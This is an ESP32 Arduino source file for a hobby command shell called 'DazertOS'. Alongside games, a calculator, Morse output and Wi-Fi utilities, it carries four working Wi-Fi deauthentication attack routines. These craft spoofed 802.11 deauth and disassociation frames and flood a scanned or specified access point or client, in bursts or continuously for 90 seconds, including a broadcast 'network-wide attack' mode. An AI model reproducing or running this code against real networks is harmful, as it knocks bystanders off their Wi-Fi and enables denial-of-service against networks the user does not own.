#include <WiFi.h>
#include <BluetoothSerial.h>
#include <time.h>
#include <Preferences.h>
#include <esp_wifi.h>
#include <esp_event.h>

#if !defined(CONFIG_BT_ENABLED) || !defined(CONFIG_BLUEDROID_ENABLED)
#error Bluetooth is not enabled! Please run `make menuconfig` to and enable it
#endif

#define LED_PIN 2

BluetoothSerial SerialBT;
Preferences preferences;

String currentLang = "en"; // Default: English

struct LangStrings {
  String help;
  String sysInfo;
  String reboot;
  String ledOn;
  String ledOff;
  String wifiScan;
  String wifiScanFailed;
  String wifiNoNetworks;
  String wifiConnect;
  String wifiConnectInvalid;
  String wifiConnectPrompt;
  String wifiConnecting;
  String wifiConnected;
  String wifiConnectFailed;
  String wifiStatus;
  String wifiStatusConnected;
  String wifiStatusDisconnected;
  String wifiDeauthUsage;
  String wifiDeauthInvalidMac;
  String wifiDeauthInvalidChannel;
  String wifiDeauthClientMacPrompt;
  String wifiDeauthClientMacInvalid;
  String wifiDeauthStart;
  String wifiDeauthCycle;
  String wifiDeauthComplete;
  String wifiDeauthContinuousStart;
  String wifiDeauthContinuousStatus;
  String wifiDeauthContinuousStop;
  String wifiDeauthInteractivePrompt;
  String passGen;
  String passGenInvalid;
  String morse;
  String morseComplete;
  String calc;
  String calcInvalid;
  String calcDivZero;
  String calcResult;
  String setVar;
  String getVar;
  String gameGuess;
  String gameGuessPrompt;
  String gameGuessLow;
  String gameGuessHigh;
  String gameGuessWin;
  String gameGuessExit;
  String gameTicTacToe;
  String gameTicTacToeInvalid;
  String gameTicTacToeComputer;
  String gameTicTacToeWin;
  String gameTicTacToeDraw;
  String getTime;
  String getTimeNoWiFi;
  String getTimeFailed;
  String unknownCommand;
  String setLang;
  String setLangInvalid;
};

// Language strings
LangStrings langEn = {
  "Available commands:",
  "System information:",
  "Rebooting...",
  "OK. LED turned on.",
  "OK. LED turned off.",
  "Starting Wi-Fi scan...",
  "Error: Wi-Fi scan failed.",
  "No networks found.",
  "Interactive Wi-Fi connect",
  "Invalid network number. Cancelled.",
  "Enter password for \"",
  "Connecting to ",
  "WiFi connected! IP: ",
  "Failed to connect.",
  "Wi-Fi status:",
  "Status: Connected\nSSID: %s\nIP address: %s\nSignal strength (RSSI): %d dBm",
  "Status: Disconnected",
  "Error: Use format 'wifi_deauth <MAC> <channel>'",
  "Error: Invalid MAC address format. Use AA:BB:CC:DD:EE:FF",
  "Error: Channel must be from 1 to 13.",
  "Enter client MAC (or Enter for network-wide attack): ",
  "Invalid client MAC format, using broadcast attack.",
  "Powerful attack on %s (client: %s) on channel %d",
  "Cycle %d/20, sent %lu packets, memory: %d bytes",
  "Attack completed (sent %lu packets).",
  "Continuous attack on %s (client: %s) on channel %d. Enter 'stop' or wait 90 seconds.",
  "Sent %lu packets, memory: %d bytes",
  "Attack stopped (sent %lu packets).",
  "Enter network number for attack (or 0 to cancel): ",
  "Generated password: ",
  "Error: Length must be from 1 to 128.",
  "Transmitting Morse code via LED: ",
  "Transmission completed.",
  "Calculate expression",
  "Error: Invalid format. Use: calc <number> <operator> <number>",
  "Error: Division by zero!",
  "Result: %s",
  "Error: Use format 'set_var <key> <value>'",
  "Value '%s': %s",
  "Number guessing game",
  "I chose a number (1-100). Enter 'exit' to quit.\nYour guess: ",
  "Too low!",
  "Too high!",
  "You guessed it!",
  "Thanks for playing!",
  "Tic-Tac-Toe game",
  "Invalid move. Try again.",
  "Computer's move...",
  "You win!",
  "It's a draw!",
  "Get current time",
  "Connect to Wi-Fi first using 'wifi_connect'",
  "Failed to get time",
  "Error: Unknown command '%s'",
  "Language set to '%s'",
  "Error: Use 'set_lang en' or 'set_lang ru'"
};

LangStrings langRu = {
  "Список команд:",
  "Системная информация:",
  "Перезагрузка...",
  "ОК. Светодиод включён.",
  "ОК. Светодиод выключен.",
  "Запуск сканирования Wi-Fi...",
  "Ошибка: Сканирование Wi-Fi не удалось.",
  "Сети не найдены.",
  "Интерактивное подключение к Wi-Fi",
  "Неверный номер. Отмена.",
  "Введите пароль для \"",
  "Подключение к ",
  "WiFi подключён! IP: ",
  "Не удалось подключиться.",
  "Статус Wi-Fi:",
  "Статус: Подключён\nSSID: %s\nIP-адрес: %s\nМощность сигнала (RSSI): %d дБм",
  "Статус: Отключён",
  "Ошибка: Используйте формат 'wifi_deauth <MAC> <канал>'",
  "Ошибка: Неверный формат MAC-адреса. Используйте AA:BB:CC:DD:EE:FF",
  "Ошибка: Канал должен быть от 1 до 13.",
  "Введите MAC устройства (или Enter для атаки на всю сеть): ",
  "Неверный формат MAC устройства, используется широковещательная атака.",
  "Мощная атака на %s (устройство: %s) на канале %d",
  "Цикл %d/20, отправлено %lu пакетов, память: %d байт",
  "Атака завершена (отправлено %lu пакетов).",
  "Мощная непрерывная атака на %s (устройство: %s) на канале %d. Введите 'stop' или дождитесь 90 секунд.",
  "Отправлено %lu пакетов, память: %d байт",
  "Атака остановлена (отправлено %lu пакетов).",
  "Введите номер сети для атаки (или 0 для отмены): ",
  "Сгенерированный пароль: ",
  "Ошибка: Длина должна быть от 1 до 128.",
  "Передача кода Морзе через светодиод: ",
  "Передача завершена.",
  "Вычислить выражение",
  "Ошибка: Неверный формат. Используйте: calc <число> <оператор> <число>",
  "Ошибка: Деление на ноль!",
  "Результат: %s",
  "Ошибка: Используйте формат 'set_var <ключ> <значение>'",
  "Значение '%s': %s",
  "Игра 'Угадай число'",
  "Я загадал число (1-100). Введите 'exit' для выхода.\nВаше предположение: ",
  "Слишком мало!",
  "Слишком много!",
  "Вы угадали!",
  "Спасибо за игру!",
  "Игра 'Крестики-нолики'",
  "Неверный ход. Попробуйте снова.",
  "Ход компьютера...",
  "Вы выиграли!",
  "Ничья!",
  "Получить текущее время",
  "Сначала подключитесь к Wi-Fi с помощью 'wifi_connect'",
  "Не удалось получить время",
  "Ошибка: Неизвестная команда '%s'",
  "Язык установлен на '%s'",
  "Ошибка: Используйте 'set_lang en' или 'set_lang ru'"
};

struct MultiStream {
  void print(const String& s) { Serial.print(s); SerialBT.print(s); }
  void println(const String& s = "") { Serial.println(s); SerialBT.println(s); }
  void printf(const char *format, ...) {
    char buf[256];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    Serial.print(buf);
    SerialBT.print(buf);
  }
} out;

String readSerialLine() {
  String line = "";
  Stream* activeStream = nullptr;
  while (true) {
    if (Serial.available()) activeStream = &Serial;
    else if (SerialBT.available()) activeStream = &SerialBT;
    else { delay(10); continue; }
    
    char c = activeStream->read();
    if (c == '\n' || c == '\r') {
      if (line.length() > 0) {
        if (activeStream == &Serial) out.println();
        else out.println(line);
        return line;
      }
    } else if (c >= 32 && c != 127) {
      if (activeStream == &Serial) Serial.print(c);
      line += c;
    }
  }
}

void printLogo() {
  out.println();
  out.println(" ____   ___   ____ ");
  out.println("|  _ \\ / _ \\ / ___|");
  out.println("| | | | | | |\\___ \\ ");
  out.println("| |_| | |_| | ___) |");
  out.println("|____/ \\___/ |____/ ");
  out.println("     DazertOS v1.5");
  out.println();
}

void getTimeOverNTP() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  if (WiFi.status() != WL_CONNECTED) {
    out.println(lang.getTimeNoWiFi);
    return;
  }
  
  configTime(3600, 3600, "pool.ntp.org"); 
  
  struct tm timeinfo;
  if (!getLocalTime(&timeinfo)) {
    out.println(lang.getTimeFailed);
    return;
  }
  
  out.println("\n---[ " + String(currentLang == "ru" ? "Текущая дата и время" : "Current date and time") + " ]---");
  
  char time_buffer[80];
  strftime(time_buffer, sizeof(time_buffer), "%A, %B %d %Y, %H:%M:%S", &timeinfo);
  
  out.println(time_buffer);
  
  out.println("-----------------------------");
}

void setVar(String arg) {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  int spaceIndex = arg.indexOf(' ');
  if (spaceIndex == -1) {
    out.println(lang.setVar);
    return;
  }
  String key = arg.substring(0, spaceIndex);
  String value = arg.substring(spaceIndex + 1);
  
  preferences.begin("dazert-os", false);
  preferences.putString(key.c_str(), value);
  preferences.end();
  
  out.printf("Variable '%s' set to '%s'\n", key.c_str(), value.c_str());
}

void getVar(String key) {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  preferences.begin("dazert-os", true);
  String value = preferences.getString(key.c_str(), "(not found)");
  preferences.end();
  
  out.printf(lang.getVar.c_str(), key.c_str(), value.c_str());
}

void ledOn() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  out.println(lang.ledOn);
  digitalWrite(LED_PIN, HIGH);
}

void ledOff() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  out.println(lang.ledOff);
  digitalWrite(LED_PIN, LOW);
}

void printSystemInfo() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  out.println("\n---[ " + lang.sysInfo + " ]---");
  out.printf("Chip model: %s (rev. %d)\n", ESP.getChipModel(), ESP.getChipRevision());
  out.printf("Cores: %d\n", ESP.getChipCores());
  out.printf("Flash size: %d MB\n", ESP.getFlashChipSize() / (1024 * 1024));
  out.printf("MAC address: %s\n", WiFi.macAddress().c_str());
  out.printf("Free memory: %d bytes\n", ESP.getFreeHeap());
}

void wifiScan() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  out.println(lang.wifiScan);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  int n = WiFi.scanNetworks(false);
  if (n == WIFI_SCAN_FAILED) {
    out.println(lang.wifiScanFailed);
    return;
  } else if (n == 0) {
    out.println(lang.wifiNoNetworks);
    return;
  }
  
  out.printf(currentLang == "ru" ? "Найдено сетей: %d\n" : "Found networks: %d\n", n);
  for (int i = 0; i < n; ++i) {
    out.printf("%d: %s (BSSID: %s, %d dBm, %s: %d, %s)\n", 
               i + 1, 
               WiFi.SSID(i).c_str(), 
               WiFi.BSSIDstr(i).c_str(), 
               WiFi.RSSI(i), 
               currentLang == "ru" ? "канал" : "channel",
               WiFi.channel(i), 
               WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? (currentLang == "ru" ? "Открытая" : "Open") : (currentLang == "ru" ? "Защищённая" : "Secured"));
  }
  WiFi.scanDelete();
}

void interactiveWiFiConnect() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  wifiScan();
  out.print(lang.wifiConnectPrompt);
  String netNumStr = readSerialLine();
  int netNum = netNumStr.toInt();

  if (netNum <= 0 || netNum > WiFi.scanNetworks()) {
    out.println(lang.wifiConnectInvalid);
    return;
  }

  String selectedSSID = WiFi.SSID(netNum - 1);
  out.print(lang.wifiConnect + "\"" + selectedSSID + "\": ");
  String password = readSerialLine();

  out.print(lang.wifiConnecting + selectedSSID);
  WiFi.begin(selectedSSID.c_str(), password.c_str());
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 30) {
    delay(500); out.print("."); attempts++;
  }
  out.println();
  if (WiFi.status() == WL_CONNECTED) {
    out.println(lang.wifiConnected + WiFi.localIP().toString());
  } else {
    out.println(lang.wifiConnectFailed);
  }
}

void wifiStatus() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  out.println("\n---[ " + lang.wifiStatus + " ]---");
  if (WiFi.status() == WL_CONNECTED) {
    out.printf(lang.wifiStatusConnected.c_str(), WiFi.SSID().c_str(), WiFi.localIP().toString().c_str(), WiFi.RSSI());
  } else {
    out.println(lang.wifiStatusDisconnected);
  }
  out.println("----------------------");
}

void generatePassword(int length) {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  if (length <= 0 || length > 128) {
    out.println(lang.passGenInvalid);
    return;
  }
  out.print(lang.passGen);
  const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
  String pass = "";
  for (int i = 0; i < length; i++) {
    pass += chars[random(0, strlen(chars))];
  }
  out.println(pass);
}

void blinkMorse(char c) {
  int dot_len = 150;
  switch (toupper(c)) {
    case 'H': for (int i = 0; i < 4; i++) { digitalWrite(LED_PIN, HIGH); delay(dot_len); digitalWrite(LED_PIN, LOW); delay(dot_len); } break;
    case 'E': digitalWrite(LED_PIN, HIGH); delay(dot_len); digitalWrite(LED_PIN, LOW); break;
    case 'L': digitalWrite(LED_PIN, HIGH); delay(dot_len); digitalWrite(LED_PIN, LOW); delay(dot_len); digitalWrite(LED_PIN, HIGH); delay(dot_len * 3); digitalWrite(LED_PIN, LOW); delay(dot_len); for (int i = 0; i < 2; i++) { digitalWrite(LED_PIN, HIGH); delay(dot_len); digitalWrite(LED_PIN, LOW); delay(dot_len); } break;
    case 'O': for (int i = 0; i < 3; i++) { digitalWrite(LED_PIN, HIGH); delay(dot_len * 3); digitalWrite(LED_PIN, LOW); delay(dot_len); } break;
    case ' ': delay(dot_len * 4); break;
  }
  delay(dot_len * 2);
}

void morseCommand(String text) {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  out.println(lang.morse + text);
  for (int i = 0; i < text.length(); i++) {
    blinkMorse(text[i]);
  }
  out.println("\n" + lang.morseComplete);
}

void executeCalc(String expression) {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  double num1, num2;
  char op;
  int items = sscanf(expression.c_str(), "%lf %c %lf", &num1, &op, &num2);

  if (items != 3) {
    out.println(lang.calcInvalid);
    return;
  }
  
  double result = 0;
  bool success = true;
  switch (op) {
    case '+': result = num1 + num2; break;
    case '-': result = num1 - num2; break;
    case '*': result = num1 * num2; break;
    case '/': 
      if (num2 == 0) { out.println(lang.calcDivZero); success = false; }
      else { result = num1 / num2; }
      break;
    default: out.println(lang.calcInvalid); success = false; break;
  }

  if (success) {
    out.println(lang.calcResult + String(result));
  }
}

void guessTheNumberGame() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  out.println("\n---[ " + lang.gameGuess + " ]---");
  out.println(lang.gameGuessPrompt);
  int target = random(1, 101);
  while (true) {
    out.print(lang.gameGuessPrompt);
    String guessStr = readSerialLine();
    if (guessStr == "exit") { out.println(lang.gameGuessExit); break; }
    int guess = guessStr.toInt();
    if (guess < target) out.println(lang.gameGuessLow);
    else if (guess > target) out.println(lang.gameGuessHigh);
    else { out.println(lang.gameGuessWin); break; }
  }
}

void ticTacToeGame() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  char board[9] = {'1','2','3','4','5','6','7','8','9'};
  auto printBoard = [&]() {
    out.println();
    for (int i = 0; i < 9; i += 3) {
      out.printf(" %c | %c | %c \n", board[i], board[i+1], board[i+2]);
      if (i < 6) out.println("---|---|---");
    }
    out.println();
  };
  auto checkWin = [&]() -> char {
    const int wins[8][3] = {{0,1,2},{3,4,5},{6,7,8},{0,3,6},{1,4,7},{2,5,8},{0,4,8},{2,4,6}};
    for (int i = 0; i < 8; ++i) {
      if (board[wins[i][0]] == board[wins[i][1]] && board[wins[i][1]] == board[wins[i][2]]) return board[wins[i][0]];
    }
    for (int i = 0; i < 9; ++i) if (board[i] != 'X' && board[i] != 'O') return ' ';
    return 'D';
  };

  out.println("\n---[ " + lang.gameTicTacToe + " ]---");
  printBoard();

  while (true) {
    out.print(currentLang == "ru" ? "Ваш ход (1-9): " : "Your move (1-9): ");
    int move = readSerialLine().toInt();
    if (move < 1 || move > 9 || board[move-1] == 'X' || board[move-1] == 'O') {
      out.println(lang.gameTicTacToeInvalid);
      continue;
    }
    board[move-1] = 'X';
    printBoard();
    char winner = checkWin();
    if (winner != ' ') {
      if (winner == 'X') out.println(lang.gameTicTacToeWin);
      else if (winner == 'D') out.println(lang.gameTicTacToeDraw);
      break;
    }

    out.println(lang.gameTicTacToeComputer);
    int computer_move;
    do { computer_move = random(0, 9); } 
    while (board[computer_move] == 'X' || board[computer_move] == 'O');
    board[computer_move] = 'O';
    delay(500);
    printBoard();
    winner = checkWin();
    if (winner != ' ') {
      if (winner == 'O') out.println(currentLang == "ru" ? "Компьютер выиграл!" : "Computer wins!");
      else if (winner == 'D') out.println(lang.gameTicTacToeDraw);
      break;
    }
  }
}

void wifiDeauth(String arg) {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  int spaceIndex = arg.indexOf(' ');
  if (spaceIndex == -1) {
    out.println(lang.wifiDeauthUsage);
    return;
  }
  String macStr = arg.substring(0, spaceIndex);
  String channelStr = arg.substring(spaceIndex + 1);
  int channel = channelStr.toInt();

  if (macStr.length() != 17) {
    out.println(lang.wifiDeauthInvalidMac);
    return;
  }
  uint8_t mac[6];
  int values[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) != 6) {
    out.println(lang.wifiDeauthInvalidMac);
    return;
  }
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];

  if (channel < 1 || channel > 13) {
    out.println(lang.wifiDeauthInvalidChannel);
    return;
  }

  out.print(lang.wifiDeauthClientMacPrompt);
  String clientMacStr = readSerialLine();
  uint8_t clientMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  if (clientMacStr.length() == 17) {
    if (sscanf(clientMacStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
      for (int i = 0; i < 6; i++) clientMac[i] = (uint8_t)values[i];
    } else {
      out.println(lang.wifiDeauthClientMacInvalid);
    }
  }

  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
  uint8_t disassocPacket[26] = {0xA0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
  memcpy(&deauthPacket[4], clientMac, 6);
  memcpy(&deauthPacket[10], mac, 6);
  memcpy(&deauthPacket[16], mac, 6);
  memcpy(&disassocPacket[4], clientMac, 6);
  memcpy(&disassocPacket[10], mac, 6);
  memcpy(&disassocPacket[16], mac, 6);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  out.printf(lang.wifiDeauthStart.c_str(), macStr.c_str(), (clientMacStr.length() == 17 ? clientMacStr : (currentLang == "ru" ? "все" : "all")).c_str(), channel);
  unsigned long packetCount = 0;
  for (int cycle = 0; cycle < 20; cycle++) {
    for (int i = 0; i < 500; i++) {
      uint8_t reason = (i % 3 == 0) ? 0x01 : (i % 3 == 1) ? 0x04 : 0x07;
      deauthPacket[24] = reason;
      disassocPacket[24] = reason;
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
      delay(3);
      packetCount += 2;
    }
    out.printf(lang.wifiDeauthCycle.c_str(), cycle + 1, packetCount, ESP.getFreeHeap());
  }
  out.printf(lang.wifiDeauthComplete.c_str(), packetCount);

  esp_wifi_set_promiscuous(false);
}

void wifiDeauthInteractive() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  wifiScan();
  out.print(lang.wifiDeauthInteractivePrompt);
  String netNumStr = readSerialLine();
  int netNum = netNumStr.toInt();

  if (netNum <= 0 || netNum > WiFi.scanNetworks()) {
    out.println(lang.wifiConnectInvalid);
    return;
  }

  String macStr = WiFi.BSSIDstr(netNum - 1);
  int channel = WiFi.channel(netNum - 1);

  uint8_t mac[6];
  int values[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) != 6) {
    out.println(lang.wifiDeauthInvalidMac);
    return;
  }
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];

  out.print(lang.wifiDeauthClientMacPrompt);
  String clientMacStr = readSerialLine();
  uint8_t clientMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  if (clientMacStr.length() == 17) {
    if (sscanf(clientMacStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
      for (int i = 0; i < 6; i++) clientMac[i] = (uint8_t)values[i];
    } else {
      out.println(lang.wifiDeauthClientMacInvalid);
    }
  }

  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
  uint8_t disassocPacket[26] = {0xA0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
  memcpy(&deauthPacket[4], clientMac, 6);
  memcpy(&deauthPacket[10], mac, 6);
  memcpy(&deauthPacket[16], mac, 6);
  memcpy(&disassocPacket[4], clientMac, 6);
  memcpy(&disassocPacket[10], mac, 6);
  memcpy(&disassocPacket[16], mac, 6);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  out.printf(lang.wifiDeauthStart.c_str(), macStr.c_str(), (clientMacStr.length() == 17 ? clientMacStr : (currentLang == "ru" ? "все" : "all")).c_str(), channel);
  unsigned long packetCount = 0;
  for (int cycle = 0; cycle < 20; cycle++) {
    for (int i = 0; i < 500; i++) {
      uint8_t reason = (i % 3 == 0) ? 0x01 : (i % 3 == 1) ? 0x04 : 0x07;
      deauthPacket[24] = reason;
      disassocPacket[24] = reason;
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
      delay(3);
      packetCount += 2;
    }
    out.printf(lang.wifiDeauthCycle.c_str(), cycle + 1, packetCount, ESP.getFreeHeap());
  }
  out.printf(lang.wifiDeauthComplete.c_str(), packetCount);

  esp_wifi_set_promiscuous(false);
}

void wifiDeauthContinuous(String arg) {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  int spaceIndex = arg.indexOf(' ');
  if (spaceIndex == -1) {
    out.println(lang.wifiDeauthUsage);
    return;
  }
  String macStr = arg.substring(0, spaceIndex);
  String channelStr = arg.substring(spaceIndex + 1);
  int channel = channelStr.toInt();

  if (macStr.length() != 17) {
    out.println(lang.wifiDeauthInvalidMac);
    return;
  }
  uint8_t mac[6];
  int values[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) != 6) {
    out.println(lang.wifiDeauthInvalidMac);
    return;
  }
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];

  if (channel < 1 || channel > 13) {
    out.println(lang.wifiDeauthInvalidChannel);
    return;
  }

  out.print(lang.wifiDeauthClientMacPrompt);
  String clientMacStr = readSerialLine();
  uint8_t clientMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  if (clientMacStr.length() == 17) {
    if (sscanf(clientMacStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
      for (int i = 0; i < 6; i++) clientMac[i] = (uint8_t)values[i];
    } else {
      out.println(lang.wifiDeauthClientMacInvalid);
    }
  }

  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
  uint8_t disassocPacket[26] = {0xA0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
  memcpy(&deauthPacket[4], clientMac, 6);
  memcpy(&deauthPacket[10], mac, 6);
  memcpy(&deauthPacket[16], mac, 6);
  memcpy(&disassocPacket[4], clientMac, 6);
  memcpy(&disassocPacket[10], mac, 6);
  memcpy(&disassocPacket[16], mac, 6);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  out.printf(lang.wifiDeauthContinuousStart.c_str(), macStr.c_str(), (clientMacStr.length() == 17 ? clientMacStr : (currentLang == "ru" ? "все" : "all")).c_str(), channel);
  unsigned long packetCount = 0;
  unsigned long startTime = millis();
  unsigned long maxDuration = 90000; // 90 seconds
  while (millis() - startTime < maxDuration) {
    for (int i = 0; i < 500; i++) {
      uint8_t reason = (i % 3 == 0) ? 0x01 : (i % 3 == 1) ? 0x04 : 0x07;
      deauthPacket[24] = reason;
      disassocPacket[24] = reason;
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
      delay(3);
      packetCount += 2;
    }
    out.printf(lang.wifiDeauthContinuousStatus.c_str(), packetCount, ESP.getFreeHeap());
    if (Serial.available() || SerialBT.available()) {
      String input = readSerialLine();
      if (input == "stop") break;
    }
  }
  out.printf(lang.wifiDeauthContinuousStop.c_str(), packetCount);
  esp_wifi_set_promiscuous(false);
}

void wifiDeauthContinuousInteractive() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  wifiScan();
  out.print(lang.wifiDeauthInteractivePrompt);
  String netNumStr = readSerialLine();
  int netNum = netNumStr.toInt();

  if (netNum <= 0 || netNum > WiFi.scanNetworks()) {
    out.println(lang.wifiConnectInvalid);
    return;
  }

  String macStr = WiFi.BSSIDstr(netNum - 1);
  int channel = WiFi.channel(netNum - 1);

  uint8_t mac[6];
  int values[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) != 6) {
    out.println(lang.wifiDeauthInvalidMac);
    return;
  }
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];

  out.print(lang.wifiDeauthClientMacPrompt);
  String clientMacStr = readSerialLine();
  uint8_t clientMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  if (clientMacStr.length() == 17) {
    if (sscanf(clientMacStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
      for (int i = 0; i < 6; i++) clientMac[i] = (uint8_t)values[i];
    } else {
      out.println(lang.wifiDeauthClientMacInvalid);
    }
  }

  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
  uint8_t disassocPacket[26] = {0xA0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
  memcpy(&deauthPacket[4], clientMac, 6);
  memcpy(&deauthPacket[10], mac, 6);
  memcpy(&deauthPacket[16], mac, 6);
  memcpy(&disassocPacket[4], clientMac, 6);
  memcpy(&disassocPacket[10], mac, 6);
  memcpy(&disassocPacket[16], mac, 6);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  out.printf(lang.wifiDeauthContinuousStart.c_str(), macStr.c_str(), (clientMacStr.length() == 17 ? clientMacStr : (currentLang == "ru" ? "все" : "all")).c_str(), channel);
  unsigned long packetCount = 0;
  unsigned long startTime = millis();
  unsigned long maxDuration = 90000; // 90 seconds
  while (millis() - startTime < maxDuration) {
    for (int i = 0; i < 500; i++) {
      uint8_t reason = (i % 3 == 0) ? 0x01 : (i % 3 == 1) ? 0x04 : 0x07;
      deauthPacket[24] = reason;
      disassocPacket[24] = reason;
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
      delay(3);
      packetCount += 2;
    }
    out.printf(lang.wifiDeauthContinuousStatus.c_str(), packetCount, ESP.getFreeHeap());
    if (Serial.available() || SerialBT.available()) {
      String input = readSerialLine();
      if (input == "stop") break;
    }
  }
  out.printf(lang.wifiDeauthContinuousStop.c_str(), packetCount);
  esp_wifi_set_promiscuous(false);
}

void setLang(String lang) {
  LangStrings& langStrings = (currentLang == "ru") ? langRu : langEn;
  if (lang == "en" || lang == "ru") {
    currentLang = lang;
    preferences.begin("dazert-os", false);
    preferences.putString("language", lang);
    preferences.end();
    out.printf(langStrings.setLang.c_str(), lang.c_str());
  } else {
    out.println(langStrings.setLangInvalid);
  }
}

